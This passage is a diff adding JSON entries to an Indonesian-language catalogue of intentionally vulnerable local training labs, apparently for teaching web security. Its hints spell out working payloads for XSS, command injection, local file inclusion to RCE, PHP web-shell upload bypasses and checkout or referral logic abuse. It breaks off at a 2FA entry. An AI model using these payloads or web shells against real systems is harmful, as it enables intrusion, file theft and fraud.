+        "Lihat Hint Goal: form ini menerima file avatar apa saja tanpa validasi tipe konten atau\nmagic byte di server. File SVG sebenarnya adalah dokumen XML biasa dan boleh berisi tag <script> atau atribut event handler seperti onload — begitu\nfile .svg dibuka langsung lewat URL (bukan lewat <img src=\"..svg\"> , yang di kebanyakan browser mem-sandbox script di\ndalamnya), browser merender dan mengeksekusi script tersebut dengan origin situs ini,\nlengkap dengan akses ke document.cookie milik situs ini. Simpan kode berikut\nsebagai file pwned.svg di komputer kamu: <svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"><text y=\"20\">pwned</text></svg> Upload lewat form di bawah, lalu klik link \"Lihat avatar saya (ukuran penuh)\"\nyang muncul setelah upload berhasil — itu membuka file SVG-nya langsung (bukan sebagai <img> ), sehingga onload di dalamnya dieksekusi."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "avatar"
+      ]
+    },
+    {
+      "title": "DOM-based XSS via postMessage",
+      "paragraphs": [
+        "Listener message tidak pernah memvalidasi event.origin, dan langsung menulis event.data ke innerHTML - halaman iframe attacker manapun bisa mengirim payload XSS."
+      ],
+      "id": "a05-injection--xss--postmessage-xss",
+      "category": "a05-injection",
+      "topic": "xss",
+      "source_lab_status": 200,
+      "source_order": 72,
+      "source_hints": [
+        "Lihat Hint Goal: halaman ini mendengarkan event message — mekanisme postMessage yang legal untuk komunikasi antar window/iframe, termasuk lintas\norigin — dan menulis event.data langsung ke innerHTML elemen di\nbawah, TANPA mengecek event.origin sama sekali. Artinya halaman, iframe, atau\ndomain mana pun bisa mengirim pesan ke halaman ini dan pesan tersebut akan\nlangsung dirender sebagai HTML aktif. Buka halaman attacker (PoC) — halaman itu\nmeng-embed halaman ini di dalam <iframe> lalu mengirim payload XSS lewat postMessage() begitu iframe-nya selesai dimuat."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "CSP yang terlihat aman tapi tidak melindungi",
+      "paragraphs": [
+        "CSP dengan script-src 'self' 'unsafe-inline' tidak benar-benar memblokir apa pun - reflected XSS biasa tetap berjalan normal meski header CSP \"ada\"."
+      ],
+      "id": "a05-injection--xss--csp-bypass",
+      "category": "a05-injection",
+      "topic": "xss",
+      "source_lab_status": 200,
+      "source_order": 73,
+      "source_hints": [
+        "Lihat Hint Goal: halaman ini punya bug reflected XSS yang PERSIS sama dengan Lab 1\n(parameter q dicetak ke body HTML tanpa htmlspecialchars() ), TAPI\nhalaman ini juga mengirim header Content-Security-Policy . Banyak tim menganggap\nbegitu CSP terpasang, XSS otomatis \"termitigasi\" — cek dulu header responsnya sendiri: curl -i \"http://localhost:8079/xss/lab11_csp_bypass.php?q=test\" atau lewat DevTools → tab Network → pilih request halaman ini →\nlihat Response Headers. Perhatikan nilai script-src -nya: script-src 'self' 'unsafe-inline' . Direktif 'unsafe-inline' secara\neksplisit MENGIZINKAN <script> inline dan atribut event handler inline\n(seperti onerror=... ) — dua vektor utama yang justru seharusnya diblok CSP.\nSekarang coba payload reflected XSS yang sama seperti Lab 1: ?q=<script>alert(document.domain)</script> Payload tetap jalan walau CSP \"terpasang\" — hubungkan dua pengamatan ini:\nheader CSP ada, tapi 'unsafe-inline' membuat direktif script-src pada dasarnya tidak berarti apa-apa untuk mencegah inline XSS."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "q"
+      ]
+    },
+    {
+      "title": "Command Injection (output terlihat)",
+      "paragraphs": [
+        "Bentuk paling mudah dikenali: output dari perintah yang disisipkan langsung ditampilkan ke halaman, sehingga bisa langsung dikonfirmasi dan dieksploitasi secara in-band.",
+        "Contoh payload: host=127.0.0.1; id"
+      ],
+      "id": "a05-injection--command-injection--visible",
+      "category": "a05-injection",
+      "topic": "command-injection",
+      "source_lab_status": 200,
+      "source_order": 74,
+      "source_hints": [
+        "Lihat Hint Goal: fitur \"network diagnostic\" ini menjalankan ping -c 2 <host> dan menampilkan hasilnya. Tidak ada validasi/sanitasi\ninput, sehingga kamu bisa menyisipkan perintah tambahan lewat metakarakter shell. Coba: 127.0.0.1; id 127.0.0.1 && whoami 127.0.0.1 | cat /etc/passwd $(whoami) atau `whoami`"
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "host"
+      ]
+    },
+    {
+      "title": "Blind Command Injection (time-based)",
+      "paragraphs": [
+        "Output perintah tidak pernah ditampilkan maupun disimpan - respons aplikasi selalu sama. Perintah sleep disisipkan untuk membuktikan bahwa payload benar-benar dieksekusi lewat delay pada waktu respons.",
+        "Contoh payload: domain=example.com; sleep 5"
+      ],
+      "id": "a05-injection--command-injection--blind",
+      "category": "a05-injection",
+      "topic": "command-injection",
+      "source_lab_status": 200,
+      "source_order": 75,
+      "source_hints": [
+        "Lihat Hint Goal: fitur \"domain availability check\" ini tidak pernah menampilkan output\nmaupun error apa pun — responsnya selalu generik. Karena itu kamu tidak bisa memakai\nteknik in-band. Gunakan perintah sleep untuk membuktikan eksekusi dan mengukur\ndelay pada response time. Coba: example.com; sleep 5 example.com && sleep 5 $(sleep 5)"
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "domain"
+      ]
+    },
+    {
+      "title": "Command Injection dengan Filter Bypass",
+      "paragraphs": [
+        "Filter memblokir karakter pemisah perintah yang paling umum, tapi lupa mem-filter newline atau command substitution (backtick / $()) yang punya efek serupa.",
+        "Contoh payload: host=127.0.0.1%0aid (newline sebagai pemisah perintah)"
+      ],
+      "id": "a05-injection--command-injection--filter-bypass",
+      "category": "a05-injection",
+      "topic": "command-injection",
+      "source_lab_status": 200,
+      "source_order": 76,
+      "source_hints": [
+        "Lihat Hint Goal: input difilter untuk membuang karakter ; , | , dan & . Filter blacklist seperti ini hampir selalu bisa dilewati. Coba (gunakan\nnewline URL-encoded %0a di address bar, atau kirim langsung lewat Burp Repeater): 127.0.0.1%0aid (newline sebagai pemisah perintah, tidak ada di blacklist) 127.0.0.1 `id` (command substitution dengan backtick) 127.0.0.1 $(id) (command substitution dengan $() )"
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "host"
+      ]
+    },
+    {
+      "title": "Argument Injection",
+      "paragraphs": [
+        "Input sudah dibungkus aman secara shell (mis. escapeshellarg()), sehingga metakarakter seperti ; | & tidak berguna. Tapi jika input diteruskan sebagai argumen program tanpa penanda akhir opsi (--), nilai yang diawali tanda minus (-) akan ditafsirkan program sebagai flag, bukan data.",
+        "Contoh payload: url=-V (curl menampilkan info versi, bukan mengambil URL apa pun)"
+      ],
+      "id": "a05-injection--command-injection--argument-injection",
+      "category": "a05-injection",
+      "topic": "command-injection",
+      "source_lab_status": 200,
+      "source_order": 77,
+      "source_hints": [
+        "Lihat Hint Goal: fitur \"link checker\" ini membungkus input dengan escapeshellarg() sehingga metakarakter shell klasik ( ; | & dan spasi) sudah tidak berguna untuk lolos dari shell — tapi aplikasi lupa mengakhiri daftar opsi curl dengan -- , sehingga nilai yang diawali\ntanda minus tetap diteruskan apa adanya dan ditafsirkan oleh curl sendiri sebagai flag,\nbukan sebagai URL. Ini disebut argument injection — berbeda dari OS\ncommand injection biasa karena tidak butuh metakarakter shell sama sekali. Buktikan dengan: -h (curl menampilkan seluruh daftar opsi/help, bukan mengambil URL) -V (curl menampilkan info versi & build — information disclosure) -K/etc/hosts (curl mencoba membaca /etc/hosts sebagai file\n      konfigurasi — error yang muncul membuktikan file lokal berhasil dibaca) Diskusi: karena aplikasi ini hanya punya satu parameter yang bisa disuntik,\ndampaknya di sini terbatas pada pembuktian konsep. Pada tool nyata seperti git , tar , atau rsync yang menerima banyak argumen dari input pengguna,\nargument injection serupa pernah menghasilkan CVE dengan dampak RCE / arbitrary file write."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "url"
+      ]
+    },
+    {
+      "title": "Basic LFI (simple case)",
+      "paragraphs": [
+        "Tidak ada filter maupun whitelist sama sekali - path apa pun yang bisa di-resolve filesystem akan langsung dimasukkan ke include().",
+        "Contoh payload: ?page=../../../../etc/passwd"
+      ],
+      "id": "a05-injection--lfi--basic",
+      "category": "a05-injection",
+      "topic": "lfi",
+      "source_lab_status": 200,
+      "source_order": 78,
+      "source_hints": [
+        "Lihat Hint Goal: parameter page dimasukkan langsung ke include() tanpa validasi apa pun. Coba baca file sistem di luar direktori aplikasi: ?page=../../../../etc/passwd ?page=../secret/config.php (file konfigurasi di luar webroot —\n  perhatikan isinya tidak akan ikut tercetak sebagai teks PHP karena benar-benar dieksekusi\n  sebagai kode PHP oleh include() ; gunakan Lab 7 untuk membaca *source code*-nya\n  lewat wrapper php://filter )"
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "page"
+      ]
+    },
+    {
+      "title": "Traversal diblokir, absolute path lolos",
+      "paragraphs": [
+        "Filter menolak input yang mengandung ../, tapi lupa bahwa path absolut (mis. /etc/passwd) tidak memerlukan notasi traversal sama sekali untuk menunjuk file di luar direktori aplikasi.",
+        "Contoh payload: ?page=/etc/passwd"
+      ],
+      "id": "a05-injection--lfi--absolute-bypass",
+      "category": "a05-injection",
+      "topic": "lfi",
+      "source_lab_status": 200,
+      "source_order": 79,
+      "source_hints": [
+        "Lihat Hint Goal: filter memblokir ../ , tapi tidak memvalidasi bahwa path yang\ndikirim harus relatif. Kalau lokasi file targetnya sudah diketahui, kita tidak perlu traversal\nsama sekali: ?page=/etc/passwd (path absolut, tidak mengandung ../ sehingga\n  lolos filter)"
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "page"
+      ]
+    },
+    {
+      "title": "Traversal sequence dihapus non-recursive",
+      "paragraphs": [
+        "str_replace('../', '', $input) hanya menghapus satu lapis kemunculan. Input seperti ....// akan tersisa ../ setelah satu kali penghapusan.",
+        "Contoh payload: ?page=....//....//....//etc/passwd"
+      ],
+      "id": "a05-injection--lfi--nonrecursive-strip",
+      "category": "a05-injection",
+      "topic": "lfi",
+      "source_lab_status": 200,
+      "source_order": 80,
+      "source_hints": [
+        "Lihat Hint Goal: ../ dihapus, tapi hanya satu kali (non-recursive). Sisipkan\nkarakter ekstra supaya setelah satu kali penghapusan, hasilnya tetap jadi ../ : ....//....//....//....//etc/passwd — setelah ../ pertama\n  yang cocok dihapus dari ....// , sisanya adalah ../"
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "page"
+      ]
+    },
+    {
+      "title": "Filter lalu URL-decode berlebih",
+      "paragraphs": [
+        "Filter ../ dijalankan duluan, baru input di-urldecode() manual sekali lagi setelahnya. Payload yang di-double URL-encode lolos filter (masih terenkode saat difilter), lalu \"muncul\" jadi traversal asli setelah decode kedua.",
+        "Contoh payload: ?page=%252e%252e%252fetc%252fpasswd"
+      ],
+      "id": "a05-injection--lfi--double-decode",
+      "category": "a05-injection",
+      "topic": "lfi",
+      "source_lab_status": 200,
+      "source_order": 81,
+      "source_hints": [
+        "Lihat Hint Goal: aplikasi men-decode input sekali lagi setelah filter traversal\ndijalankan. Kirim payload yang di- double URL-encode supaya lolos filter,\nlalu baru \"muncul\" jadi ../ setelah decode kedua: %252e%252e%252f = double-encode dari ../ ( %25 adalah encode dari karakter % itu sendiri) Payload lengkap: ?page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "page"
+      ]
+    },
+    {
+      "title": "Validasi hanya di awal path",
+      "paragraphs": [
+        "Validasi hanya mengecek bahwa string input dimulai dengan pages/, tanpa menormalisasi hasil akhirnya lewat realpath().",
+        "Contoh payload: ?page=pages/../../../../etc/passwd"
+      ],
+      "id": "a05-injection--lfi--start-validation",
+      "category": "a05-injection",
+      "topic": "lfi",
+      "source_lab_status": 200,
+      "source_order": 82,
+      "source_hints": [
+        "Lihat Hint Goal: validasi hanya mengecek awal string, bukan hasil akhir path setelah\ntraversal di-resolve. Selama input dimulai dengan pages/ , validasi lolos —\napa pun yang menyusul setelahnya tetap diproses: ?page=pages/../../../../etc/passwd"
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "page"
+      ]
+    },
+    {
+      "title": "Validasi ekstensi dengan null byte bypass",
+      "paragraphs": [
+        "Validasi memeriksa bahwa input berakhiran .png. Null byte (%00) disisipkan di antara path target dan ekstensi palsu - teknik historis dari PHP < 5.3.4, disimulasikan di lab ini supaya tetap bisa dipraktikkan.",
+        "Contoh payload: ?page=../../../../etc/passwd%00.png"
+      ],
+      "id": "a05-injection--lfi--extension-nullbyte",
+      "category": "a05-injection",
+      "topic": "lfi",
+      "source_lab_status": 200,
+      "source_order": 83,
+      "source_hints": [
+        "Lihat Hint Goal: aplikasi cuma mengizinkan file yang berakhiran .png (dianggap \"aman\", untuk memuat file gambar). Sisipkan null byte\n( %00 ) di antara path target dan ekstensi .png palsu — validasi\nakan melihat string penuh yang berakhir .png dan meloloskannya, tapi file yang\nbenar-benar dibuka terpotong sebelum null byte: ?page=../../../../etc/passwd%00.png Catatan: ini adalah teknik historis (bug asli di PHP <\n5.3.4). PHP modern sudah tidak rentan secara native — lab ini mensimulasikan perilaku\nlama tersebut secara sengaja di kode aplikasinya supaya tekniknya tetap bisa dipraktikkan."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "page"
+      ]
+    },
+    {
+      "title": "LFI to RCE (PHP wrappers & log poisoning)",
+      "paragraphs": [
+        "Tidak ada validasi sama sekali. Gunakan php://filter untuk membaca source code tanpa mengeksekusinya, php://input untuk mengeksekusi body request sebagai PHP, atau racuni log request (header User-Agent) lalu include file log tersebut untuk mencapai RCE penuh.",
+        "Contoh payload: ?page=php://filter/convert.base64-encode/resource=pages/secret_notes.php"
+      ],
+      "id": "a05-injection--lfi--wrappers-rce",
+      "category": "a05-injection",
+      "topic": "lfi",
+      "source_lab_status": 200,
+      "source_order": 84,
+      "source_hints": [
+        "Lihat Hint Goal: tidak ada validasi sama sekali ( include($_GET['page']) mentah) — tapi kali ini kita naikkan level dari sekadar membaca file menjadi eksekusi kode (RCE) , lewat tiga teknik berbeda: Source code disclosure lewat php://filter . Meng- include() file .php langsung akan MENGEKSEKUSINYA, bukan\n  menampilkan source code-nya. Bungkus dengan filter convert.base64-encode supaya\n  isinya dikembalikan sebagai teks (base64), bukan dieksekusi: ?page=php://filter/convert.base64-encode/resource=pages/secret_notes.php — lalu decode base64 hasilnya untuk menemukan komentar rahasia di dalamnya. RCE lewat php://input . Wrapper ini membuat include() mengeksekusi BODY request sebagai kode PHP. Kirim lewat POST: curl -s -X POST --data '<?php system($_GET[\"cmd\"]); ?>' \\\n  \"http://localhost:8079/lfi/lab7_wrappers_rce.php?page=php://input&cmd=id\" Log poisoning. Header User-Agent dari SETIAP request ke\n  aplikasi ini dicatat mentah-mentah ke app_data/access.log (lihat header.php ). Kirim User-Agent berisi payload PHP, lalu include log tersebut: curl -s -A '<?php system($_GET[\"cmd\"]); ?>' \"http://localhost:8079/lfi/index.php\" > /dev/null\ncurl -s \"http://localhost:8079/lfi/lab7_wrappers_rce.php?page=../app_data/access.log&cmd=id\""
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "page",
+        "cmd"
+      ]
+    },
+    {
+      "title": "Remote code execution via unrestricted upload",
+      "paragraphs": [
+        "Bentuk paling dasar: file apa pun diterima dan disimpan langsung ke direktori yang bisa mengeksekusi PHP.",
+        "Contoh: upload shell.php, akses uploads/shell.php?cmd=id."
+      ],
+      "id": "a05-injection--file-upload--unrestricted",
+      "category": "a05-injection",
+      "topic": "file-upload",
+      "source_lab_status": 200,
+      "source_order": 85,
+      "source_hints": [
+        "Lihat Hint Goal: tidak ada validasi sama sekali. Upload file PHP berisi webshell, lalu\nakses langsung file yang ter-upload untuk eksekusi kode: <?php system($_GET['cmd']); ?> Simpan sebagai shell.php , upload lewat form di bawah, lalu buka uploads/shell.php?cmd=id ."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "file"
+      ]
+    },
+    {
+      "title": "Web shell upload via Content-Type restriction bypass",
+      "paragraphs": [
+        "Aplikasi memeriksa $_FILES['file']['type'], nilai yang sepenuhnya dikendalikan oleh client lewat header multipart - sama sekali tidak dicocokkan dengan isi file sesungguhnya.",
+        "Contoh: curl -F \"file=@shell.php;type=image/png\" ..."
+      ],
+      "id": "a05-injection--file-upload--content-type-bypass",
+      "category": "a05-injection",
+      "topic": "file-upload",
+      "source_lab_status": 200,
+      "source_order": 86,
+      "source_hints": [
+        "Lihat Hint Goal: validasi hanya mengandalkan header Content-Type pada bagian\nmultipart request - nilai ini sepenuhnya dikendalikan client, terlepas dari isi/ekstensi file\nyang sesungguhnya. Upload shell.php tapi paksa Content-Type-nya jadi image/png : curl -s -F \"file=@shell.php;type=image/png\" http://localhost:8079/upload/lab2_content_type.php Atau lewat Burp Repeater: intercept upload biasa, ubah Content-Type: image/png pada bagian file di body multipart, biarkan nama file\n& isinya tetap shell.php / kode PHP."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "file"
+      ]
+    },
+    {
+      "title": "Web shell upload via path traversal",
+      "paragraphs": [
+        "Direktori upload \"aman\" mematikan eksekusi PHP, tapi nama file dari field multipart dipakai mentah untuk membangun path tujuan sehingga ../ bisa membawa file keluar ke direktori lain yang PHP-nya aktif.",
+        "Contoh: filename=\"../uploads/shell.php\""
+      ],
+      "id": "a05-injection--file-upload--path-traversal",
+      "category": "a05-injection",
+      "topic": "file-upload",
+      "source_lab_status": 200,
+      "source_order": 87,
+      "source_hints": [
+        "Lihat Hint Goal: form ini untuk upload avatar, disimpan ke uploads_safe/ — folder yang PHP-nya sengaja dimatikan (coba upload shell.php normal ke\nsini, lalu akses langsung, hasilnya 403 Forbidden , bukan RCE). Tapi nama file\ntidak disanitasi dari traversal, dan aplikasi ini juga punya folder uploads/ yang\nPHP-nya aktif (dipakai lab lain). Karena field nama file di request multipart\nsepenuhnya bisa dikontrol lewat proxy seperti Burp Repeater (tidak terbatas pada apa yang\ndiketik di dialog pemilih file browser), sisipkan traversal pada nama file supaya file\nmendarat di uploads/ , bukan uploads_safe/ : Content-Disposition: form-data; name=\"file\"; filename=\"../uploads/shell.php\" Lalu akses uploads/shell.php?cmd=id (bukan lewat uploads_safe/ )."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "file"
+      ]
+    },
+    {
+      "title": "Web shell upload via extension blacklist bypass",
+      "paragraphs": [
+        "Blacklist memblokir .php/.php3/.php4/.php5/.php7 tapi lupa varian lain (.phtml, .pht) yang tetap dieksekusi PHP oleh konfigurasi Apache bawaan.",
+        "Contoh: upload shell.phtml."
+      ],
+      "id": "a05-injection--file-upload--blacklist-bypass",
+      "category": "a05-injection",
+      "topic": "file-upload",
+      "source_lab_status": 200,
+      "source_order": 88,
+      "source_hints": [
+        "Lihat Hint Goal: blacklist memblokir .php , .php3 , .php4 , .php5 , .php7 — tapi lupa varian lain yang\ntetap dieksekusi sebagai PHP oleh Apache secara default: <?php system($_GET['cmd']); ?> Simpan sebagai shell.phtml (atau .pht ), upload, lalu\nakses uploads/shell.phtml?cmd=id ."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "file"
+      ]
+    },
+    {
+      "title": "Web shell upload via extension handling override (.htaccess)",
+      "paragraphs": [
+        "Blacklist ekstensi script sudah lengkap, tapi direktori upload punya AllowOverride All aktif - file bernama persis .htaccess lolos validasi (ekstensinya \"htaccess\", bukan salah satu yang diblokir) dan langsung dihormati Apache untuk mendefinisikan ulang ekstensi mana yang dieksekusi sebagai PHP.",
+        "Contoh: upload .htaccess berisi AddType application/x-httpd-php .jpg, lalu upload shell.jpg."
+      ],
+      "id": "a05-injection--file-upload--obfuscated-extension",
+      "category": "a05-injection",
+      "topic": "file-upload",
+      "source_lab_status": 200,
+      "source_order": 89,
+      "source_hints": [
+        "Lihat Hint Goal: blacklist ekstensi kali ini sudah cukup lengkap (mencakup .phtml / .pht yang jadi celah di Lab 4) - tapi tidak pernah berpikir\nbahwa nama file yang di-upload bisa jadi file KONFIGURASI Apache itu sendiri. Direktori uploads/ punya AllowOverride All aktif (default pada image php:8.2-apache ), jadi .htaccess yang berhasil ter-upload akan\nlangsung berlaku: Upload file bernama persis .htaccess berisi: AddType application/x-httpd-php .jpg (ekstensi \"file\" ini secara teknis adalah htaccess , bukan salah satu yang\n  diblokir, jadi lolos validasi) Upload file kedua shell.jpg berisi kode PHP biasa (ekstensi .jpg juga jelas tidak ada di blacklist manapun) Akses uploads/shell.jpg?cmd=id - Apache sekarang memperlakukan .jpg sebagai PHP, mengikuti .htaccess yang baru saja\n  di-upload attacker sendiri."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "file"
+      ]
+    },
+    {
+      "title": "Remote code execution via polyglot web shell upload",
+      "paragraphs": [
+        "Ekstensi .php memang diizinkan, tapi aplikasi menambahkan pengecekan getimagesize() sebagai \"keamanan tambahan\". Fungsi itu hanya membaca header di awal file, sehingga file dengan header gambar valid diikuti kode PHP tetap lolos.",
+        "Contoh: printf 'GIF89a;\\n<?php system($_GET[\"cmd\"]); ?>' > shell.php"
+      ],
+      "id": "a05-injection--file-upload--polyglot",
+      "category": "a05-injection",
+      "topic": "file-upload",
+      "source_lab_status": 200,
+      "source_order": 90,
+      "source_hints": [
+        "Lihat Hint Goal: fitur \"theme icon\" ini memang mengizinkan ekstensi .php / .phtml secara sah, tapi developer menambahkan pengecekan getimagesize() untuk \"memastikan\" isinya gambar asli. getimagesize() hanya memeriksa header/\nstruktur di awal file, bukan seluruh isinya - buat file polyglot : header GIF\nvalid diikuti kode PHP: printf 'GIF89a;\\n<?php system($_GET[\"cmd\"]); ?>' > shell.php Upload shell.php tersebut. getimagesize() akan\nmengenalinya sebagai GIF valid (lolos), tapi karena ekstensinya .php , saat\ndiakses lewat browser file ini tetap dieksekusi PHP sepenuhnya (tag <?php ?> tetap dijalankan di mana pun posisinya dalam file) — buka uploads/shell.php?cmd=id ."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "file"
+      ]
+    },
+    {
+      "title": "Web shell upload via race condition",
+      "paragraphs": [
+        "Ada jendela waktu antara file disimpan ke direktori executable dan selesai divalidasi/dihapus. Selama jendela itu, file sudah live dan bisa diakses/dieksekusi.",
+        "Contoh: upload shell.php, lalu akses uploads/shell.php?cmd=id secepatnya sebelum proses validasi selesai."
+      ],
+      "id": "a05-injection--file-upload--race-condition",
+      "category": "a05-injection",
+      "topic": "file-upload",
+      "source_lab_status": 200,
+      "source_order": 91,
+      "source_hints": [
+        "Lihat Hint Goal: file di- move_uploaded_file() langsung ke uploads/ (folder yang PHP-nya aktif), BARU divalidasi isinya (dan dihapus kalau\ntidak valid) setelah jeda 3 detik. Selama jeda itu, file\nsudah live dan bisa dieksekusi. Upload shell.php lewat form di bawah, lalu secepatnya (dalam 3 detik, di tab/\nterminal lain) akses: curl \"http://localhost:8079/upload/uploads/shell.php?cmd=id\" Di dunia nyata jendela race biasanya hanya beberapa milidetik dan butuh\nmengirim request upload & request akses secara konkuren (mis. lewat Burp\nTurbo Intruder atau beberapa proses curl paralel) supaya request akses tiba\ntepat di antara move_uploaded_file() dan proses hapus. Lab ini melebar-lebarkan\njendelanya jadi 3 detik supaya bisa didemonstrasikan\nmanual di kelas."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "file"
+      ]
+    },
+    {
+      "title": "Price tampering lewat hidden field",
+      "paragraphs": [
+        "Server menghitung total dari $_POST['price'] alih-alih mengambil harga asli dari katalog - hidden field bisa diubah bebas lewat DevTools/Burp sebelum submit."
+      ],
+      "id": "a06-insecure-design--business-logic--price-tampering",
+      "category": "a06-insecure-design",
+      "topic": "business-logic",
+      "source_lab_status": 200,
+      "source_order": 92,
+      "source_hints": [
+        "Lihat Hint Form checkout di bawah menampilkan harga produk sebagai <input type=\"hidden\" name=\"price\" value=\"150000\"> .\nServer menghitung total = $_POST['price'] * $_POST['quantity'] apa adanya, tanpa\nmengecek ulang harga sebenarnya dari katalog. Buka DevTools/Burp, ubah nilai field price (mis. jadi 100 ) sebelum request dikirim, lalu submit form."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "price",
+        "quantity"
+      ]
+    },
+    {
+      "title": "Negative quantity",
+      "paragraphs": [
+        "Harga diambil aman dari server, tapi kuantitas tidak pernah divalidasi harus positif - kuantitas negatif membuat total negatif, yang lalu \"dikreditkan\" ke saldo user."
+      ],
+      "id": "a06-insecure-design--business-logic--negative-quantity",
+      "category": "a06-insecure-design",
+      "topic": "business-logic",
+      "source_lab_status": 200,
+      "source_order": 93,
+      "source_hints": [
+        "Lihat Hint Kali ini harga produk dilihat ulang dari katalog server (tidak bisa dimanipulasi\nlewat hidden field), tapi field quantity tidak pernah dicek harus bernilai positif.\nCoba masukkan jumlah negatif, mis. -5 , lalu submit. Server akan menghitung total = harga * quantity yang hasilnya negatif, dan kode memperlakukan total negatif\nsebagai \"refund\" yang ditambahkan ke wallet_balance kamu."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "product_id",
+        "quantity"
+      ]
+    },
+    {
+      "title": "Coupon stacking / reuse",
+      "paragraphs": [
+        "Kupon tidak pernah ditandai \"sudah dipakai\" setelah diterapkan - mengulang request yang sama berkali-kali terus menambah diskon."
+      ],
+      "id": "a06-insecure-design--business-logic--coupon-stacking",
+      "category": "a06-insecure-design",
+      "topic": "business-logic",
+      "source_lab_status": 200,
+      "source_order": 94,
+      "source_hints": [
+        "Lihat Hint Kupon DISKON20 (diskon 20%) terlihat seperti kode sekali pakai, tapi\nserver tidak pernah menandainya \"sudah dipakai\" setelah diterapkan — tidak ada pengecekan used_by / used_count yang memblokir pemakaian berikutnya. Submit form ini\nberkali-kali dengan kode & kuantitas yang sama persis, lalu perhatikan \"total penghematan dari kupon ini\" di bawah terus bertambah setiap kali."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "quantity",
+        "coupon_code"
+      ]
+    },
+    {
+      "title": "Skip step alur checkout bertahap",
+      "paragraphs": [
+        "Step terakhir (konfirmasi/selesai) tidak pernah mengecek apakah step pembayaran benar-benar terjadi lebih dulu - urutan alur cuma \"dijaga\" lewat tautan di UI, bukan di server."
+      ],
+      "id": "a06-insecure-design--business-logic--skip-checkout-step",
+      "category": "a06-insecure-design",
+      "topic": "business-logic",
+      "source_lab_status": 200,
+      "source_order": 95,
+      "source_hints": [
+        "Lihat Hint Checkout ini punya 3 step: ?step=1 (review cart), ?step=2 (pembayaran), ?step=3 (konfirmasi & pesanan selesai). UI cuma \"menuntun\" kamu\nlewat tautan dari step 1 → 2 → 3, tapi server tidak pernah mengecek apakah step 2 benar-benar\nselesai sebelum menjalankan step 3. Coba langsung buka ?step=3 tanpa pernah menyentuh step 2, lalu lihat riwayat pesanan di bawah —\npesanan tetap tercatat PAID ."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": []
+    },
+    {
+      "title": "Abuse bonus referral tanpa batas",
+      "paragraphs": [
+        "Satu-satunya validasi adalah keunikan string username - tidak ada verifikasi email, limit per-IP, atau deteksi fraud, sehingga bonus bisa diklaim berkali-kali lewat akun baru yang trivial dibuat."
+      ],
+      "id": "a06-insecure-design--business-logic--unlimited-referral-abuse",
+      "category": "a06-insecure-design",
+      "topic": "business-logic",
+      "source_lab_status": 200,
+      "source_order": 96,
+      "source_hints": [
+        "Lihat Hint Program referral ini memberi bonus tetap ke pemilik kode ( alice )\nsetiap ada pendaftaran baru yang memakai kode referralnya. Satu-satunya pengecekan \"orang baru\"\nyang dilakukan server adalah membandingkan string username persis sama dengan yang\nsudah pernah dipakai — tidak ada verifikasi email, tidak ada limit per-IP/per-session, tidak\nada batas total. Daftar berulang kali dengan username yang sedikit berbeda tiap kali\n( user1 , user2 , user3 , ...) memakai kode yang sama\n( ALICE-REF ), lalu lihat saldo wallet alice\n& jumlah pendaftar terus naik."
+      ],
+      "source_requires_login": false,
+      "source_checked_at": "2026-09-12T10:24:02.979955+00:00",
+      "source_fields": [
+        "username",
+        "email",
+        "ref"
+      ]
+    },
+    {
+      "title": "2FA bypass lewat forced browsing",
+      "paragraphs": [
